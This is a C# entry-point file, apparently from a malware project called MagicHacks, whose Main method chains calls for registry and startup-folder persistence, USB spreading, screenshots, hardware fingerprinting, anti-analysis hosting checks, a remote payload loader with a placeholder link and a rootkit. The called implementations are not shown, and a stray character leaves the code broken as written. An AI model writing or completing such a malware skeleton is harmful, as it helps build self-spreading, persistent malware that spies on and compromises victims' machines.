using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace MagicHacks
{
    class Program
    {
        static void Main(string[] args)
        {
            //Autorun
            cCore.Autorun.cAutorun.Reg();
            cCore.Autorun.cAutorun.StartUpFolder();s

            //Implant очка
            cCore.Implant.cUsbSpread.UsbSpread();
            cCore.Implant.cScreenshot.getScreen();
            cCore.Implant.cCPU.getCPU();
            cCore.Implant.cGPU.getGPU();
            cCore.Implant.cHWID.getHWID();
            cCore.Implant.cBit.getBit();

            //AntiAnalysis
            cCore.AntiAnalysis.cHosting.Hosting();

            //Malware
            cCore.cMalware.cLoader.Loader("ссылка!");
            cCore.cMalware.cRootKit.Protect();
        }
    }
}
